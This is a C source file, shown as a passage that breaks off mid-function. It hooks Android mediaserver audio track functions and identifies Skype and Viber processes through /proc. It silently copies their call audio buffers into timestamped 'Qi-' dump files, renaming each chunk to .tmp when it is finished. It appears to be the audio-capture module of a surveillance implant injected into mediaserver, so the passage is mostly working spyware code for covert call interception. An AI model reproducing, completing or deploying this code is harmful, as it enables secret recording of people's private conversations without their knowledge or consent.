#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <dlfcn.h>
#include <stdlib.h>
#include "libt.h"
#include "util.h"
#include <errno.h>
#include "hooker.h"
#include "uthash.h"
#include <string.h>
#include <unistd.h>


static int ip_register_offset = 0xd;
static int fd = 0;
static int fd_in = 0;
static int fd_out = 0;

struct cblk_t *cblkTracks = NULL;
//struct cblk_t *cblkRecordTracks = NULL;
extern int android_version_ID;
extern unsigned int mname_offset;
extern unsigned int mname_this_offset;
extern unsigned int mStramType_this_offset;
extern unsigned int mState_offset;
extern unsigned int sample_rate_offset;
extern unsigned int mClient_thisP_offset;
extern unsigned int mPid_mClient_offset;
char *dumpPath =  ".................____________.......................";
char * printTrackstate(track_state t){
  switch (t){
    case IDLE:
      return "IDLE";
      break;
    case TERMINATED:      return "TERMINATED";
      break;
    case FLUSHED:
      return "FLUSHED";
      break;
    case STOPPED:
      return "STOPPED";
      break;
      // next 2 states are currently used for fast tracks only
    case STOPPING_1:     // waiting for first underrun
      return "STOPPING_1";
      break;
    case STOPPING_2:     // waiting for presentation complete
      return "STOPPING_2";
      break;
    case RESUMING:
      return "RESUMING:";
      break;
    case ACTIVE:
      return "ACTIVE";
      break;
    case PAUSING:
      return "PAUSING";
      break;
    case PAUSED:
      return "PAUSED";
      break;

    default:
      break;
  }
#ifdef DEBUG_HOOKFNC
  log("state=%d",t);
#endif
  return "UNKNOWN";
}

#define PRG_UNKNOWN_ID 0x0
#define PRG_SKYPE_ID 0x0146
#define PRG_VIBER_ID 0x0148
#define PRG_MEDIASERVER_ID 0x1

#define MAX_STRLEN 50
enum{
	POS_SKYPE=0,
	POS_VIBER,
	POS_MEDIA,
	POS_RET,
	POS_MAX
};

const char *pid_name[]={
		"com.skype.raider",
		"com.viber.voip",
		"/system/bin/mediaserver",
		"unknown"
};
int last_pid_lookup[POS_MAX];
int last_pid_lookup_res[POS_MAX];
int last_found=-1;
int get_command_id(int pid) {
	int i=0;
	int found = 0;
	if(pid<=0){
		return 0;
	}
	if(last_pid_lookup[POS_RET]==pid){
		found=1;
	}
	for(i=0;i<POS_RET&&found==0;i++)
	{
		if(last_pid_lookup[i]==pid){
			last_pid_lookup_res[POS_RET]=last_pid_lookup_res[i];
			last_found=i;
			found=1;
		}
	}
	if(found==0){
		FILE *f;
		char file[MAX_STRLEN], cmdline[MAX_STRLEN] = {0};
		sprintf(file, "/proc/%d/cmdline", pid);

		f = fopen(file, "r");
		if (f) {
			char *p = cmdline;
			fgets(cmdline, MAX_STRLEN-1, f);
			fclose(f);
			cmdline[MAX_STRLEN-1]='\0';
			while (*p) {
				p += strlen(p);
				if (*(p + 1)) {
					*p = ' ';
				}
				p++;
			}
			last_pid_lookup[POS_RET] = pid;
			if(strncmp(cmdline,pid_name[POS_SKYPE],16) == 0) {
				last_pid_lookup[POS_SKYPE] = pid;
				last_pid_lookup_res[POS_RET]=last_pid_lookup_res[POS_SKYPE] = PRG_SKYPE_ID;
				last_found=POS_SKYPE;
			}else  if(strncmp(cmdline, pid_name[POS_VIBER],14) == 0) {
				last_pid_lookup[POS_VIBER] = pid;
				last_pid_lookup_res[POS_RET]=last_pid_lookup_res[POS_VIBER] = PRG_VIBER_ID;
				last_found=POS_VIBER;
			}else  if(strncmp(cmdline,pid_name[POS_MEDIA],23) == 0) {
				last_pid_lookup[POS_MEDIA] = pid;
				last_pid_lookup_res[POS_RET]=last_pid_lookup_res[POS_MEDIA] = PRG_MEDIASERVER_ID;
				last_found=POS_MEDIA;
			}else{
				last_pid_lookup_res[POS_RET] = PRG_UNKNOWN_ID;
				last_found=POS_RET;
			}

		} else {
#if defined DEBUG_HOOKFNC
			log("unable to open file %s\n", file);
#endif
			return 0;
		}

	}
#if defined DEBUG_HOOKFNC
	if(last_found<POS_MAX && last_found>=0){
		log("[%d]%d=%s\n",last_found,pid,pid_name[last_found]);
	}else{
		log("[%d]%d=%s\n",last_found,pid,"?unknown?");
	}
#endif
	return last_pid_lookup_res[POS_RET];
}

/* start signaling hooks */

#define USE_MNAME

void* recordTrackStart_h(void* a, void* b, void* c, void* d, void* e, void* f, void* g, void* h, void* i, void* j, void* k, void* l, void* m, void* n, void* o, void* p, void* q, void* r, void* s, void* t, void* u, void* w)  {

  void* (*h_ptr)(void* a, void* b, void* c, void* d, void* e, void* f, void* g, void* h, void* i, void* j, void* k, void* l, void* m, void* n, void* o, void* p, void* q, void* r, void* s, void* t, void* u, void* w);
  void* result;
  int res;
  
#if defined DEBUG_HOOKFNC & !defined USE_MNAME
//  log("\t\t\t------- enter recordTrackStart -------------\n");
#endif

  h_ptr = (void *) recordTrackStart_helper.orig;
  helper_precall(&recordTrackStart_helper);
  result = h_ptr( a,  b,  c,  d,  e,  f,  g,  h,  i,  j,  k,  l,  m,  n,  o,  p,  q,  r,  s,  t,  u,  w);

#if defined DEBUG_HOOKFNC & !defined USE_MNAME
//  log("\t\t\t\tresult: %d\n", (int) result);
#endif

  helper_postcall(&recordTrackStart_helper);

#if defined DEBUG_HOOKFNC & !defined USE_MNAME
//  log("\t\t\t------- exit recordTrackStart -------------\n");
#endif

  return result;

}


void* recordTrackStop_h(void* a, void* b, void* c, void* d, void* e, void* f, void* g, void* h, void* i, void* j, void* k, void* l, void* m, void* n, void* o, void* p, void* q, void* r, void* s, void* t, void* u, void* w) {

  void* (*h_ptr)(void* a, void* b, void* c, void* d, void* e, void* f, void* g, void* h, void* i, void* j, void* k, void* l, void* m, void* n, void* o, void* p, void* q, void* r, void* s, void* t, void* u, void* w);
  void* result;
  int res;
  char *filename;
  struct cblk_t *cblk_tmp;
  unsigned long cblk;
  unsigned int uintTmp;
  time_t now;

#if defined DEBUG_HOOKFNC & !defined USE_MNAME
//  log("\t\t\t------- enter recordTrackStop -------------\n");
#endif 

  h_ptr = (void *) recordTrackStop_helper.orig;
  helper_precall(&recordTrackStop_helper);
  result = h_ptr( a,  b,  c,  d,  e,  f,  g,  h,  i,  j,  k,  l,  m,  n,  o,  p,  q,  r,  s,  t,  u,  w);
  helper_postcall(&recordTrackStop_helper);

#if defined DEBUG_HOOKFNC & !defined USE_MNAME
//  log("\t\t\t\tresult: %d\n", (int) result);
#endif

  cblk = *(unsigned long*) (a + 0x1c);

#ifdef DEBUG_HOOKFNC
//  log("\tstop track cblk_id: %x\n", cblk);
#endif


  h_ptr = (void *) recordTrackStop_helper.orig;
  helper_precall(&recordTrackStop_helper);
  result = h_ptr( a,  b,  c,  d,  e,  f,  g,  h,  i,  j,  k,  l,  m,  n,  o,  p,  q,  r,  s,  t,  u,  w);
  helper_postcall(&recordTrackStop_helper);
  //  log("\t\t\t\tresult: %d\n", (int) result);

  HASH_FIND_INT( cblkTracks, &cblk, cblk_tmp);

  if( cblk_tmp != NULL  ) {

    // TODO: temporary fix
    if( cblk_tmp->stopDump == 1) {
#ifdef DEBUG_HOOKFNC
      log("\trecordTrackStop already called\n");
#endif
      return result;
    }
    cblk_tmp->stopDump = 1;

    /* write fake final header */
    now = time(NULL);
    write(cblk_tmp->fd, &now, 4); // 1] epoch start

    uintTmp = 0xf00df00d;
    write(cblk_tmp->fd, &uintTmp, 4); // 3] streamType

    uintTmp = cblk_tmp->sampleRate;
    write(cblk_tmp->fd, &uintTmp, 4); // 4] sampleRate

    uintTmp = 0;
    write(cblk_tmp->fd, &uintTmp, 4); // 5] size of block - 0 for last block

    /* rename file to .tmp and free the cblk structure  */
#ifdef DEBUG_HOOKFNC
    log("Stop: should take a dump: %s\n", cblk_tmp->filename);
#endif

    /* rename file *.bin to *.tmp */
    filename = strdup(cblk_tmp->filename); // check return value
    *(filename+strlen(filename)-1) = 'p';
    *(filename+strlen(filename)-2) = 'm';
    *(filename+strlen(filename)-3) = 't';

    res = rename(cblk_tmp->filename, filename);

#ifdef DEBUG_HOOKFNC
//    log("fname %s\n", filename);
//    log("rename %d\n", res );
#endif


    // 12/10
    if( filename != NULL) {
      free(filename);
      filename = NULL;
    }

    close(cblk_tmp->fd);

    /* free some stuff */
    if( cblk_tmp->trackId != NULL ) {
      free(cblk_tmp->trackId);
      cblk_tmp->trackId = NULL;
    }

    if( cblk_tmp->filename != NULL ) {
      free(cblk_tmp->filename);
      cblk_tmp->filename = NULL;
    }

    /* for playback tracks we keep the structure,
       for record we can free since the new track
       is created from within the dumper
     */
    HASH_DEL(cblkTracks, cblk_tmp);
    free(cblk_tmp);


#ifdef DEBUG_HOOKFNC
//    log("freed all the stuff\n");
#endif
  }

#ifdef DEBUG_HOOKFNC
//  log("\t\t\t------- exit recordTrackStop -------------\n");
#endif

  return result;
}


void*  newTrack_h(void* a, void* b, void* c, void* d, void* e, void* f, void* g, void* h, void* i, void* j, void* k, void* l, void* m, void* n, void* o, void* p, void* q, void* r, void* s, void* t, void* u, void* w) {

  void* (*h_ptr)(void* a, void* b, void* c, void* d, void* e, void* f, void* g, void* h, void* i, void* j, void* k, void* l, void* m, void* n, void* o, void* p, void* q, void* r, void* s, void* t, void* u, void* w);

  void *result;
  unsigned long cblk;
  unsigned int sampleRate;
  ssize_t res;
  /* int ii, cblkIndex; */
  unsigned int uintTmp;
  struct cblk_t *cblk_tmp= NULL;
  off_t headerStart = 0, positionTmp = 0;
  time_t now;
  int tt = 0xf;

  unsigned int bufferRaw = 0;
  unsigned int framesCount = 0;
  unsigned int frameSize = 0;

  char randString[11]; // rand %d 10 + null;
  char timestamp[11];  // epoch %ld 10 + null;
  char pidC[11]; // pid %d 10 +null
  int filenameLength = 0;
  char *filename;
  char* tmp;

  int written;
  int streamType = (int) d;
  int pid =0;

#ifdef DEBUG_HOOKFNC
// log("enter new track\n");
// log("\tpbthread: %x\n\tclient: %x\n\tstreamType: %x\n\tsampleRate: %d\n\tformat: %x\n\tchannelMask: %x\n\tframeCount: %x\n\tsharedBuffer: %x\n\tsessionId: %x\n\ttid: %x\n\tflags: %x\n", b, c,d, e, f, g, h, i, l, m, n);
#endif

  h_ptr = (void *) newTrack_helper.orig;
  helper_precall(&newTrack_helper);
  result = h_ptr( a,  b,  c,  d,  e,  f,  g,  h,  i,  j,  k,  l,  m,  n,  o,  p,  q,  r,  s,  t,  u,  w);
  helper_postcall(&newTrack_helper);

  cblk = *(unsigned long*) (a + 0x1c);
  unsigned long mClient;
  mClient = *(unsigned long*) (a + mClient_thisP_offset);
  pid = *(int*) (mClient + mPid_mClient_offset );
#ifdef DEBUG_HOOKFNC
  log("\tnew track cblk: %p calling pid=%d\n ", cblk,pid);
#endif
  if(pid>0){
	  int tmp=0;
	  tmp=get_command_id(pid);
#ifdef DEBUG_HOOKFNC
	  if(tmp<=0 && streamType==0){
		  log("pid %d not found",pid);
	  }
#endif
	  pid=tmp;
  }else{
	  pid=0;
  }
  // ----------------------------------

    /* fetch the necessary fields */

#ifdef DEBUG_HOOKFNC
//  log("\t\t\tcblk flags %x\n", *(signed int*) (cblk + 0x3c));
#endif

  /* [3] */
  frameSize = *(unsigned char*) (cblk + 0x34 );
#ifdef DEBUG_HOOKFNC
//  log("\t\t\tframeSize %x\n", frameSize);
#endif

  // not really useful, info only
  sampleRate = *(unsigned int*) (cblk + 0x30);
#ifdef DEBUG_HOOKFNC
//  log("\t\t\tsampleRate %d\n", sampleRate);
#endif

  /* [2] second field within AudioBufferProvider */
  framesCount = * (unsigned int*) (b + 4);
#ifdef DEBUG_HOOKFNC
//  log("\t\t\tframesCount %x\n", framesCount);
#endif

  /* [1] first field (ptr) within AudioBufferProvider */
  bufferRaw = *(unsigned int*) (b);


  // add the cblk to the tracks list, if
  // we don't find it, it might be because
  // the injection took place after the track
  // was created
  //log("start hash find\n");
  HASH_FIND_INT( cblkTracks, &cblk, cblk_tmp);

  if( cblk_tmp == NULL ) {

    cblk_tmp =  malloc( sizeof(struct cblk_t) );

    cblk_tmp->cblk_index = cblk;
    cblk_tmp->streamType = streamType;
    cblk_tmp->lastStatus = STATUS_NEW;
    cblk_tmp->pid=pid;
    snprintf(randString, 11, "%lu", mrand48());
    snprintf(timestamp,  11, "%d", time(NULL));
    snprintf(pidC,  11, "%d", pid);
    cblk_tmp->trackId = strdup(randString);

#ifdef DEBUG_HOOKFNC
//    log("trackId: %s\n", cblk_tmp->trackId);
#endif

    // Qi-<timestamp>-<id univoco per chiamata>-<canale>.[tmp|boh]
    // length:  2-strlen(timestamp)-strlen(randString)-1.3.1 + 3 chars for '-'
    // filenameLength including null


    if( cblk_tmp->streamType == 0 && cblk_tmp->pid>PRG_MEDIASERVER_ID ) {
      filenameLength = strlen(dumpPath) + 1 + 2 + strlen(timestamp) + strlen(randString) + 1 + 4 + 1 + 3+1+strlen(pidC);

      cblk_tmp->filename = malloc( sizeof(char) *  filenameLength  );
      snprintf(cblk_tmp->filename, filenameLength, "%s/Qi-%s-%s-%s-r.bin", dumpPath, timestamp, randString,pidC );




      cblk_tmp->fd = open(cblk_tmp->filename, O_RDWR | O_CREAT , S_IRUSR | S_IRGRP | S_IROTH);
#ifdef DEBUG_HOOKFNC
      log("filename: %s open %s ", cblk_tmp->filename,(cblk_tmp->fd>1)?"OK":"FAILED");
#endif
    }else{
#ifdef DEBUG_HOOKFNC
    	if(cblk_tmp->pid==PRG_MEDIASERVER_ID)
    	log("skipping trackId: %s owned by mediaserver ", cblk_tmp->trackId);
#endif
    }

    cblk_tmp->startOfCircularBuffer = *(unsigned int*) (cblk + 0x18);
    cblk_tmp->frameCount = *(unsigned int*) (cblk + 0x1c);

    cblk_tmp->lastBufferRaw  = bufferRaw;
    cblk_tmp->lastFrameCount = framesCount;
    cblk_tmp->lastFrameSize  = frameSize;


    cblk_tmp->sampleRate = sampleRate;

    HASH_ADD_INT(cblkTracks, cblk_index, cblk_tmp); // new track
    cblk_tmp = NULL;

    HASH_FIND_INT( cblkTracks, &cblk, cblk_tmp);

    if( cblk_tmp == NULL ) {
#ifdef DEBUG_HOOKFNC
      log("uthash issue\n");
#endif
      return result;
    }
#ifdef DEBUG_HOOKFNC
    //log("\tnew Track added cblk\n");
#endif

  }
#ifdef DEBUG_HOOKFNC
  else {
//    log("cblk not found %x\n", cblk);
  }
#endif

#ifdef DEBUG_HOOKFNC
//  log("\t\t\t----------- exit new track %p %p ------------------\n", result, a)
#endif

  return result;
}


void* playbackTrackStart_h(void* a, void* b, void* c, void* d, void* e, void* f, void* g, void* h, void* i, void* j, void* k, void* l, void* m, void* n, void* o, void* p, void* q, void* r, void* s, void* t, void* u, void* w) {

  void* (*h_ptr)(void* a, void* b, void* c, void* d, void* e, void* f, void* g, void* h, void* i, void* j, void* k, void* l, void* m, void* n, void* o, void* p, void* q, void* r, void* s, void* t, void* u, void* w);
  void* result;
  int res;
  unsigned long cblk;

  struct cblk_t *cblk_tmp= NULL;

  char randString[11]; // rand %d 10 + null;
  char timestamp[11];  // epoch %ld 10 + null;
  int filenameLength = 0;
  char *filename;


#ifdef DEBUG_HOOKFNC
//  log("\t\t\t------- enter playbackTrackStart -------------\n");
//  log("enter start track %x\n", a);
//  log("\tevent: %x\n\ttriggerSession: %x\n\n", b, c);
#endif

  cblk = *(unsigned long*) (a + 0x1c);



  HASH_FIND_INT( cblkTracks, &cblk, cblk_tmp);

  if( cblk_tmp != NULL ) {
#ifdef DEBUG_HOOKFNC
    log("\tcblk found %x last known status %s\n", cblk, (cblk_tmp->lastStatus==STATUS_STOP)?"STOP":"START");
#endif

    /* if status is STATUS_STOP, create the fields freed by stop event */
    if( cblk_tmp->lastStatus == STATUS_STOP ) {

      /* use old trackId and filename */

      // a] generate trackId
      //snprintf(randString, 11, "%lu", mrand48());
      //snprintf(timestamp,  11, "%d", time(NULL));

      //cblk_tmp->trackId = strdup(randString);

#ifdef DEBUG_HOOKFNC
      log("reusing trackId: %s\n", cblk_tmp->trackId);
#endif

      // b] generate filename and open fd
      //filenameLength = strlen(dumpPath) + 1 + 2 + strlen(timestamp) + strlen(randString) + 1 + 4 + 1 + 3;

      //cblk_tmp->filename = malloc( sizeof(char) *  filenameLength  );
      //snprintf(cblk_tmp->filename, filenameLength, "%s/Qi-%s-%s-r.bin", dumpPath, timestamp, randString );



      cblk_tmp->fd = open(cblk_tmp->filename, O_RDWR | O_CREAT , S_IRUSR | S_IRGRP | S_IROTH);
#ifdef DEBUG_HOOKFNC
      log("reusing filename: %s open:%s\n", cblk_tmp->filename,(cblk_tmp->fd>1)?"OK":"FAILED");
#endif
      // shouldn't need startOfCircularBuffer and frameCount

    }


  }
  else {
#ifdef DEBUG_HOOKFNC
    log("\tcblk not found %x\n", cblk);
#endif

  }

  h_ptr = (void *) playbackTrackStart_helper.orig;
  helper_precall(&playbackTrackStart_helper);
  result = h_ptr( a,  b,  c,  d,  e,  f,  g,  h,  i,  j,  k,  l,  m,  n,  o,  p,  q,  r,  s,  t,  u,  w);
  helper_postcall(&playbackTrackStart_helper);

#ifdef DEBUG_HOOKFNC
//  log("\t\t\t\tresult: %d\n", (int) result);
//  log("\t\t\t------- exit playbackTrackStart -------------\n");
#endif

  return result;
}

void* playbackTrackStop_h(void* a, void* b, void* c, void* d, void* e, void* f, void* g, void* h, void* i, void* j, void* k, void* l, void* m, void* n, void* o, void* p, void* q, void* r, void* s, void* t, void* u, void* w) {

  void* (*h_ptr)(void* a, void* b, void* c, void* d, void* e, void* f, void* g, void* h, void* i, void* j, void* k, void* l, void* m, void* n, void* o, void* p, void* q, void* r, void* s, void* t, void* u, void* w);
  void* result;
  int res;
  unsigned int cblk;
  char *filename;
  struct cblk_t *cblk_tmp = NULL;
  unsigned int uintTmp;
  time_t now;

#ifdef DEBUG_HOOKFNC
//  log("\t\t\t------- enter playbackTrackStop -------------\n");
#endif

  cblk = *(unsigned long*) (a + 0x1c);

#ifdef DEBUG_HOOKFNC
  log("\ttrack cblk: %x\n", cblk);
#endif

  h_ptr = (void *) playbackTrackStop_helper.orig;
  helper_precall(&playbackTrackStop_helper);
  result = h_ptr( a,  b,  c,  d,  e,  f,  g,  h,  i,  j,  k,  l,  m,  n,  o,  p,  q,  r,  s,  t,  u,  w);
  helper_postcall(&playbackTrackStop_helper);

#ifdef DEBUG_HOOKFNC
//  log("\t\t\t\tresult: %d\n", (int) result);
#endif

  HASH_FIND_INT( cblkTracks, &cblk, cblk_tmp);

  if( cblk_tmp != NULL && cblk_tmp->streamType == 0 ) {


    /* write fake final header */
    now = time(NULL);
    write(cblk_tmp->fd, &now, 4); // 1] epoch start

    uintTmp = 0xf00df00d;
    write(cblk_tmp->fd, &uintTmp, 4); // 3] streamType

    uintTmp = cblk_tmp->sampleRate;
    write(cblk_tmp->fd, &uintTmp, 4); // 4] sampleRate

    uintTmp = 0;
    write(cblk_tmp->fd, &uintTmp, 4); // 5] size of block - 0 for last block


    /* rename file to .tmp and free the cblk structure  */



    /* rename file *.bin to *.tmp */
    filename = strdup(cblk_tmp->filename); // check return value
    *(filename+strlen(filename)-1) = 'p';
    *(filename+strlen(filename)-2) = 'm';
    *(filename+strlen(filename)-3) = 't';

#ifdef DEBUG_HOOKFNC
    log("fname %s FINALIZED\n", filename);
    //log("rename %d\n", rename(cblk_tmp->filename, filename) );
#endif

    rename(cblk_tmp->filename, filename);

    if( filename != NULL)
      free(filename);


    close(cblk_tmp->fd);

    /* free some stuff */
    //if( cblk_tmp->trackId != NULL ) {
    //  free(cblk_tmp->trackId);
    //  cblk_tmp->trackId = NULL;
    //}

    //if( cblk_tmp->filename != NULL ) {
    //  free(cblk_tmp->filename);
    //  cblk_tmp->filename = NULL;
    //}

    /* 14/04/14
       patch for weird skype events
       1] newTrack
       2] start track
       3] stop track
       4] start track again

    */

    cblk_tmp->lastStatus = STATUS_STOP;
    //HASH_DEL(cblkTracks, cblk_tmp);
    //free(cblk_tmp);

#ifdef DEBUG_HOOKFNC
  //  log("freed all the stuff %x\n", cblk);
#endif
  }else{
#ifdef DEBUG_HOOKFNC
	  log("track %x not found \n", cblk);
#endif
  }

#ifdef DEBUG_HOOKFNC
  //log("\t\t\t------- exit playbackTrackStop -------------\n");
#endif

  return result;
}



void* playbackTrackPause_h(void* a, void* b, void* c, void* d, void* e, void* f, void* g, void* h, void* i, void* j, void* k, void* l, void* m, void* n, void* o, void* p, void* q, void* r, void* s, void* t, void* u, void* w) {

  void* (*h_ptr)(void* a, void* b, void* c, void* d, void* e, void* f, void* g, void* h, void* i, void* j, void* k, void* l, void* m, void* n, void* o, void* p, void* q, void* r, void* s, void* t, void* u, void* w);
  void* result;
  int res;
  unsigned long cblk;

#ifdef DEBUG_HOOKFNC
 // log("\t\t\t------- enter playbackTrackPause -------------\n");
#endif

  cblk = *(unsigned long*) (a + 0x1c);

#ifdef DEBUG_HOOKFNC
  log("\tnew track cblk: %x\n", cblk);
#endif

  h_ptr = (void *) playbackTrackStart_helper.orig;
  helper_precall(&playbackTrackStart_helper);
  result = h_ptr( a,  b,  c,  d,  e,  f,  g,  h,  i,  j,  k,  l,  m,  n,  o,  p,  q,  r,  s,  t,  u,  w);
  helper_postcall(&playbackTrackStart_helper);

#ifdef DEBUG_HOOKFNC
//  log("\t\t\t\tresult: %d\n", (int) result);
//  log("\t\t\t------- exit playbackTrackPause -------------\n");
#endif

  return result;
}





void* playbackTrack_getNextBuffer3_h(void* a, void* b, void* c, void* d, void* e, void* f, void* g, void* h, void* i, void* j, void* k, void* l, void* m, void* n, void* o, void* p, void* q, void* r, void* s, void* t, void* u, void* w) {

  void* (*h_ptr)(void* a, void* b, void* c, void* d, void* e, void* f, void* g, void* h, void* i, void* j, void* k, void* l, void* m, void* n, void* o, void* p, void* q, void* r, void* s, void* t, void* u, void* w);

  void* result;
  unsigned int* cblk_ptr;
  unsigned int cblk;
  unsigned long framesAvail;
  unsigned long bufferSize;
  unsigned long bufferStart;
  unsigned long thisStart;
  unsigned long bufferEndAddress;
  unsigned int sampleRate;
  struct timeval tv;
  ssize_t res;
  /* int ii, cblkIndex; */
  unsigned int uintTmp;
  struct cblk_t *cblk_tmp= NULL;
  off_t headerStart = 0, positionTmp = 0;
  time_t now;
  int tt = 0xf;

  unsigned int bufferRaw = 0;
  unsigned int framesCount = 0;
  unsigned int frameSize = 0;

  char randString[11]; // rand %d 10 + null;
  char timestamp[11];  // epoch %ld 10 + null;
  char pidC[11];  // pid %d 10 + null;
  int filenameLength = 0;
  char *filename;
  char* tmp;

  int written;

#ifdef DEBUG_HOOKFNC
//  log("\t\t\t------- playback3 -------------\n");
#endif

  /* if( cblk_tmp->fd == 0) { */
  /*   cblk_tmp->fd = open("/data/local/tmp/log_out" , O_RDWR , S_IRUSR | S_IRGRP | S_IROTH); */
  /* } */

  // tmp
  framesCount = * (unsigned int*) (b + 4);

#ifdef DEBUG_HOOKFNC
//  log("> pb args %x %x %x - desiredFrames: %x\n", a, b, c, framesCount);
#endif

  /* call the original function */
  h_ptr = (void *) playbackTrack_getNextBuffer_helper.orig;
  helper_precall(&playbackTrack_getNextBuffer_helper);
  result = h_ptr( a,  b,  c,  d,  e,  f,  g,  h,  i,  j,  k,  l,  m,  n,  o,  p,  q,  r,  s,  t,  u,  w);
  helper_postcall(&playbackTrack_getNextBuffer_helper);

#ifdef DEBUG_HOOKFNC
//  log("\t\t\t\tresult: %d\n", (int) result);
#endif


  /* fetch the necessary fields */
  cblk_ptr = (unsigned int*) (a + 0x1c) ;
  cblk = *cblk_ptr;

#ifdef DEBUG_HOOKFNC
//  log("\t\t\tcblk %p\n", cblk);
#endif

#ifdef DEBUG_HOOKFNC
//  log("\t\t\tcblk flags %x\n", *(signed int*) (cblk + 0x3c));
#endif

  /* [3] */
  frameSize = *(unsigned char*) (cblk + 0x34 );
#ifdef DEBUG_HOOKFNC
//  log("\t\t\tframeSize %x\n", frameSize);
#endif

  // not really useful, info only
  sampleRate = *(unsigned int*) (cblk + 0x30);
#ifdef DEBUG_HOOKFNC
//  log("\t\t\tsampleRate %d\n", sampleRate);
#endif

  /* [2] second field within AudioBufferProvider */
  framesCount = * (unsigned int*) (b + 4);
#ifdef DEBUG_HOOKFNC
//  log("\t\t\tframesCount %x\n", framesCount);
#endif

  /* [1] first field (ptr) within AudioBufferProvider */
  bufferRaw = *(unsigned int*) (b);


  // add the cblk to the tracks list, if
  // we don't find it, it might be because
  // the injection took place after the track
  // was created
  //log("start hash find\n");
  HASH_FIND_INT( cblkTracks, &cblk, cblk_tmp);


  if( cblk_tmp != NULL ) {

    if( result == 0 && framesCount != 0 && cblk_tmp->streamType == 0 && cblk_tmp->pid>1) {
      /*
       off_t lseek(int fd, off_t offset, int whence);
DESCRIPTION
       The lseek() function repositions the offset of the open file associated with the file descriptor fd to the argument offset according to the directive whence as follows:
       SEEK_SET
              The offset is set to offset bytes.
       SEEK_CUR
              The offset is set to its current location plus offset bytes.
       SEEK_END
              The offset is set to the size of the file plus offset bytes.
              
       RETURN Upon successful completion, lseek() returns the resulting offset location as measured in bytes from the beginning of the file
              */
      // header
      headerStart = lseek(cblk_tmp->fd, 0, SEEK_CUR);
      //log("\t\theaderStart: %x\n", headerStart);

      // epoch : streamType : sampleRate : blockLen

      uintTmp = 0xb00bb00b;
      write(cblk_tmp->fd, &uintTmp, 4); // 1] epoch start
      //write(cblk_tmp->fd, &uintTmp, 4); // 2] epoch end
      write(cblk_tmp->fd, &uintTmp, 4); // 3] streamType
      write(cblk_tmp->fd, &uintTmp, 4); // 4] sampleRate
      write(cblk_tmp->fd, &uintTmp, 4); // 5] size of block

#ifdef DEBUG_HOOKFNC
    //  log("\t\t\tbuffer spans: %p -> %p\n", bufferRaw, (bufferRaw + framesCount * frameSize ) );
#endif
      res = write(cblk_tmp->fd, bufferRaw, framesCount * frameSize  );
#ifdef DEBUG_HOOKFNC
    //  log("\t\t\t\twrote: %d - expected: %d\n", res, framesCount * frameSize );
#endif
      positionTmp = lseek(cblk_tmp->fd, 0, SEEK_CUR);

#ifdef DEBUG_HOOKFNC
   //   log("\t\tfake header written: %x\n", positionTmp);
#endif

      // if something is written fix the header
      if( res > 0 ) {
	// go back to start of header
	lseek(cblk_tmp->fd, headerStart, SEEK_SET);

#ifdef DEBUG_HOOKFNC
	//log("\t\trolled back: %x\n", lseek(cblk_tmp->fd, 0, SEEK_CUR));
#endif

	// write the header
	now = time(NULL);
	//tt = gettimeofday(&tv,NULL);
	written = write(cblk_tmp->fd, &now , 4); // 1] timestamp start
	//written = write(cblk_tmp->fd, &now , 4); // 2] timestamp end - fake value
	written = write(cblk_tmp->fd, &cblk_tmp->streamType , 4); // 3] streamType
	written = write(cblk_tmp->fd, &cblk_tmp->sampleRate , 4); // 4] sampleRate
	written = write(cblk_tmp->fd, &res , 4); // 5] res

#ifdef DEBUG_HOOKFNC
//	log("\t\t\theader fixed %x -> %x:%x:%x:%x\n", cblk_tmp->cblk_index, now, cblk_tmp->streamType, cblk_tmp->sampleRate, res);
#endif

	// reposition the fd
	lseek(cblk_tmp->fd, positionTmp, SEEK_SET);

#ifdef DEBUG_HOOKFNC
//	log("\t\trolled forward: %x\n", lseek(cblk_tmp->fd, 0, SEEK_CUR));
#endif

	/* dump when fd is at position >= 1048576 - 1Mb */
	if(lseek(cblk_tmp->fd, 0, SEEK_CUR) >= FILESIZE) {

#ifdef DEBUG_HOOKFNC
//	  log("should take a dump\n");
#endif

	  /* rename file *.bin to *.tmp */
	  filename = strdup(cblk_tmp->filename); // check return value
	  *(filename+strlen(filename)-1) = 'p';
	  *(filename+strlen(filename)-2) = 'm';
	  *(filename+strlen(filename)-3) = 't';

#ifdef DEBUG_HOOKFNC
	  log("fname %s\n", filename);
	  //log("rename %d\n", rename(cblk_tmp->filename, filename) );
#endif
	  rename(cblk_tmp->filename, filename);

	  if( filename != NULL)  {
	    free(filename);
	  }

	  close(cblk_tmp->fd);

	  /* generate a new filename for the track */
	  snprintf(timestamp,  11, "%d", time(NULL));
	  snprintf(pidC,  11, "%d", cblk_tmp->pid);
	  filenameLength = strlen(dumpPath) + 1 + 2 + strlen(timestamp) + strlen(cblk_tmp->trackId) + 1 + 4 + 1 + 3 +1 + strlen(pidC);

	  cblk_tmp->filename = malloc( sizeof(char) *  filenameLength  );
	  snprintf(cblk_tmp->filename, filenameLength, "%s/Qi-%s-%s-%s-r.bin", dumpPath, timestamp, cblk_tmp->trackId,pidC );

#ifdef DEBUG_HOOKFNC
//	  log("new filename: %s\n", cblk_tmp->filename);
#endif

	  cblk_tmp->fd = open(cblk_tmp->filename, O_RDWR | O_CREAT , S_IRUSR | S_IRGRP | S_IROTH);

#ifdef DEBUG_HOOKFNC
	  log("%s fd: %d continuing open%s\n", cblk_tmp->filename, cblk_tmp->fd,(cblk_tmp->fd>1)?"OK":"Failed");
#endif

	}

      }
      // otherwise remove the header, we don't need this block
      else {
	lseek(cblk_tmp->fd, headerStart, SEEK_SET);
      }

    }

    /* in both cases update cblk_tmp for the next run  */
    cblk_tmp->lastBufferRaw  = bufferRaw;
    cblk_tmp->lastFrameCount = framesCount;
    cblk_tmp->lastFrameSize  = frameSize;

  }
#ifdef DEBUG_HOOKFNC
  else {
    log("\t\tcblk not found %x\n", cblk);
  }
#endif

#ifdef DEBUG_HOOKFNC
//  log("\t\t\t------- end playback3 -------------\n");
#endif

  return result;

}



void* recordTrack_getNextBuffer3_h(void* a, void* b, void* c, void* d, void* e, void* f, void* g, void* h, void* i, void* j, void* k, void* l, void* m, void* n, void* o, void* p, void* q, void* r, void* s, void* t, void* u, void* w) {

  void* (*h_ptr)(void* a, void* b, void* c, void* d, void* e, void* f, void* g, void* h, void* i, void* j, void* k, void* l, void* m, void* n, void* o, void* p, void* q, void* r, void* s, void* t, void* u, void* w);

  void* result;
  unsigned int* cblk_ptr;
  unsigned int cblk;
  unsigned long framesAvail;
  unsigned long bufferSize;
  unsigned long bufferStart;
  unsigned long thisStart;
  unsigned long bufferEndAddress;
